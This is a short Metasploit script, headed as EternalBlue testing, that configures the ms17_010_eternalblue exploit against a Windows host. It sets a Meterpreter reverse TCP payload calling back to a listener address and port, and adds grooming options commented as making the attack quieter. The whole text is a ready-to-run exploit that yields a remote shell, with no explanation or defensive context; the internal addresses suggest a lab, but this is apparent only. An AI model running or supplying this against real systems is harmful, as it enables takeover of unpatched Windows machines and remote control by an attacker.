## EternalBlue: `testing.`
```sh
# EternalBlue – Windows 7 / Server 2008 auto exploit
use ms17_010_eternalblue
set RHOSTS 10.10.10.45
set LHOST 192.168.1.77          # <-- CHANGE THIS!
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set DisablePayloadHandler false

# Optional – try to be a bit quieter
set GroomAllocations 12
set GroomDelta 5

run
exit
```